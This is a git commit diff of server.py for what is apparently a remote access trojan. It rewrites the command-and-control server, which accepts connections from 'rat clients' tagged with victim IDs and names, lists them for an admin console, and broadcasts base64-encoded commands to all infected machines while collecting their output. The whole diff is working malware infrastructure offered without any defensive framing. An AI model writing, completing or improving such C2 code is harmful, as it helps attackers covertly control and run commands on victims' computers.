171df64b76182dde14adb9d42c48d01be79db2d4
sane800r41 <163453304+sane800r41@users.noreply.github.com>
2024-04-15 14:09:37 +0200

    :)
    Fixes to server and other things :)

--- server.py
+++ server.py
@@ -1,64 +1,128 @@
-import contextlib
-import socket
-import threading
-from colorama import Fore
 import base64
+import socket
+import time
+from threading import Thread
+from colorama import Fore
 
-PORT = 0
+PORT = 55555
 IP = "0.0.0.0"
 FULLADDRESS = (IP, PORT)
 
-ENCODING = 'utf-8'
-HEADER = 99999
+HEADER = 1000000
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(FULLADDRESS)
 
-ratconnections = []
+ratclients = []
 controlclients = []
 
-
-def start():
-    with contextlib.suppress(Exception):
+def connectionhandler():
+    print(f"{Fore.YELLOW}[i] Listening on {FULLADDRESS}{Fore.RESET}")
+    while True:
         server.listen()
-        print(f"{Fore.GREEN}[i] SERVER LISTENING ON {IP}:{PORT}")
-        while True:
-            connection, address = server.accept()
-            clientinfo = connection.recv(HEADER).decode(ENCODING)
-            print(f"{Fore.GREEN}[i] {clientinfo} HAS CONNECTED!")
-            if "@adminconsole" in clientinfo:
-                controlclients.append((connection, address))
-            else:
-                ratconnections.append((connection, address))
+        connection, address = server.accept()
+        fullclientinfo = connection.recv(HEADER).decode()
+        print(fullclientinfo)
+        if "@adminconsole" in fullclientinfo:
+            controlclients.append([fullclientinfo, connection])
+            # Thread(target=controlclient,args=[connection,fullclientinfo]).start()
+        else:
+            name = fullclientinfo.split("%")[0]
+            victimid = fullclientinfo.split("%")[1]
+            print(f"{Fore.YELLOW}[i] {name} ID: {victimid} HAS CONNECTED{Fore.RESET}")
+            ratclients.append([[victimid, name], connection])
 
 
-def sendtoall(message):
-    with contextlib.suppress(Exception):
-        output = ""
-        for connection in ratconnections:
-            try:
-                connection[0].send(message.encode(ENCODING))
-                output += connection[0].recv(HEADER).decode(ENCODING) + "\n"
-            except ConnectionResetError:
-                ratconnections.remove(connection)
-                output += f"{Fore.RED}[!] Rat client {connection} is no longer online"
+def send(message, client):
+    chunks = [message[i:i + HEADER] for i in range(0, len(message), HEADER)]
+    client.send(str(len(chunks)).encode())
+    for messag in chunks:
+        client.send(messag)
 
-        return output if output != "" else f"{Fore.RED}[!] No rat clients are online"
 
-def receivefile(message):
-    with contextlib.suppress(Exception):
-        print('kok')
+# def controlclient(conn,clientinfo): 
+#     while True:
+#         try:
+#             print(f"{Fore.YELLOW}\n[i] Waiting for command from {clientinfo}...{Fore.RESET}")
+#             chunks = conn.recv(HEADER).decode()
+#             recvout = "".join(conn.recv(HEADER).decode() for _ in range(int(chunks)))
+#             command = base64.b64decode(recvout).decode()
+#             print(f"{Fore.YELLOW}[i] Recieved command from {clientinfo}: {Fore.RESET}{command}")
+#             outputlist = []
+#             if command == "list":
+#                 longestid = 5
+#                 longestname = 20
+#                 if len(ratclients) > 0:
+#                     longestid = len(max(ratclients, key=lambda x: len(x[0][0]))[0][0])
+#                     longestname = len(max(ratclients, key=lambda x: len(x[0][1]))[0][1])
+#                 infolist = "ID" + " " * (longestid - 2) + "│ NAME" + " " * (longestname - 4) + "\n"
+#                 infolist += "─" * longestid + "┼" + "─" * longestname + "\n"
+#                 for info in ratclients:
+#                     infolist += info[0][0] + " " * (longestid - len(info[0][0])) + "│" + info[0][1] + "\n"
+#                 outputlist.append(base64.b64encode(infolist.encode(errors="ignore")))
+#             else:
+#                 for ratclient in ratclients:
+#                     try:
+#                         ratconn = ratclient[1]
+#                         send(base64.b64encode(command.encode(errors="ignore")), ratconn)
+#                         chunks = ratconn.recv(HEADER).decode()
+#                         chunksout = "".join(ratconn.recv(HEADER).decode() for _ in range(int(chunks)))
+#                         outputlist.append(chunksout)
+#                     except ConnectionResetError:
+#                         ratclients.remove(ratclient)
+
+#                 if not outputlist:
+#                     outputlist.append(base64.b64encode(
+#                         f"{Fore.RED}[SERVER] [!] No clients are online or the command had an error{Fore.RESET}".encode(
+#                             errors="ignore")))
+#             send(str(outputlist).encode(), conn)
+#         except ConnectionAbortedError:
+#             controlclients.remove(conn)
+
 
 if __name__ == "__main__":
-    with contextlib.suppress(Exception):
-        threading.Thread(target=start).start()
+    def main():  # sourcery skip: low-code-quality
+        thr = Thread(target=connectionhandler)
+        thr.start()
         while True:
-            for client in controlclients:
+            for fullconn in controlclients:
                 try:
-                    command = client[0].recv(HEADER).decode(ENCODING)
-                    print(f"{Fore.LIGHTWHITE_EX}[!] RECIEVED COMMAND {command}")
-                    cmdout = sendtoall(command)
-                    client[0].send(str(cmdout).encode(ENCODING))
-                except ConnectionResetError:
-                    controlclients.remove(client)
-                    print(f"{Fore.RED}[!] Control client {client} has disconnected")
+                    conn = fullconn[1]
+                    clientinfo = fullconn[0]
+                    print(f"{Fore.YELLOW}\n[i] Waiting for command from {clientinfo}...{Fore.RESET}")
+                    chunks = conn.recv(HEADER).decode()
+                    recvout = "".join(conn.recv(HEADER).decode() for _ in range(int(chunks)))
+                    command = base64.b64decode(recvout).decode()
+                    print(f"{Fore.YELLOW}[i] Recieved command from {clientinfo}: {Fore.RESET}{command}")
+                    outputlist = []
+                    if command == "list":
+                        longestid = 5
+                        longestname = 20
+                        if len(ratclients) > 0:
+                            longestid = len(max(ratclients, key=lambda x: len(x[0][0]))[0][0])
+                            longestname = len(max(ratclients, key=lambda x: len(x[0][1]))[0][1])
+                        infolist = "ID" + " " * (longestid - 2) + "│ NAME" + " " * (longestname - 4) + "\n"
+                        infolist += "─" * longestid + "┼" + "─" * longestname + "\n"
+                        for info in ratclients:
+                            infolist += info[0][0] + " " * (longestid - len(info[0][0])) + "│" + info[0][1] + "\n"
+                        outputlist.append(base64.b64encode(infolist.encode(errors="ignore")))
+                    else:
+                        for ratclient in ratclients:
+                            try:
+                                ratconn = ratclient[1]
+                                send(base64.b64encode(command.encode(errors="ignore")), ratconn)
+                                chunks = ratconn.recv(HEADER).decode()
+                                chunksout = "".join(ratconn.recv(HEADER).decode() for _ in range(int(chunks)))
+                                outputlist.append(chunksout)
+                            except ConnectionResetError:
+                                ratclients.remove(ratclient)
+
+                        if not outputlist:
+                            outputlist.append(base64.b64encode(
+                                f"{Fore.RED}[SERVER] [!] No clients are online or the command had an error{Fore.RESET}".encode(
+                                    errors="ignore")))
+                    send(str(outputlist).encode(), conn)
+                except ConnectionAbortedError:
+                    controlclients.remove(fullconn)
+
+    Thread(target=main).start()
